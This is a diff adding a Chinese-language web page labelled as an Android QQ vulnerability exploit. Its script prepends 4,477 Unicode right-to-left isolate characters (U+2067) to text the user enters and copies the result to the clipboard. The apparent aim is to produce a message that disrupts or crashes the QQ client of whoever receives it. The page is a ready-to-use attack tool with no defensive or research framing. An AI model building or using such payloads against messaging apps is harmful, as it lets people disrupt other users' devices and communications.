@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>安卓QQ漏洞利用</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+            background-color: #f0f0f0;
+            user-select: none; /* 禁止用户选择 */
+            -moz-user-select: none; /* Firefox */
+            -ms-user-select: none; /* Internet Explorer/Edge */
+            -webkit-user-select: none; /* Safari */
+        }
+        .container {
+            background-color: #ffffff;
+            padding: 20px 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            margin: 40px;
+            margin-top: 150px;
+        }
+        h2 {
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 20px;
+            font-size: 16px;
+        }
+        button {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 20px;
+            background-color: #007bff;
+            color: #ffffff;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        input:focus {
+            border-color: #66afe9;
+            outline: 0;
+            -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075), 0 0 8px rgba(102, 175, 233, .6);
+            box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075), 0 0 8px rgba(102, 175, 233, .6);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>安卓QQ漏洞利用</h2>
+        <input type="text" id="userInput" placeholder="输入要植入的文字">
+        <button onclick="copyText()">复制</button>
+    </div>
+
+    <script>
+        function copyText() {
+            // 获取用户输入
+            var inputText = document.getElementById("userInput").value;
+            // 在输入文字前加上4477个U+2067字符
+            var prefix = Array(4477).fill('\u2067').join('');
+            var finalText = prefix + inputText;
+
+            // 创建一个临时文本区域来复制文本
+            var tempInput = document.createElement("textarea");
+            tempInput.value = finalText;
+            document.body.appendChild(tempInput);
+            tempInput.select();
+            document.execCommand("copy");
+            document.body.removeChild(tempInput);
+
+            alert("已复制: " + finalText);
+        }
+    </script>
+
+</body>
+</html>
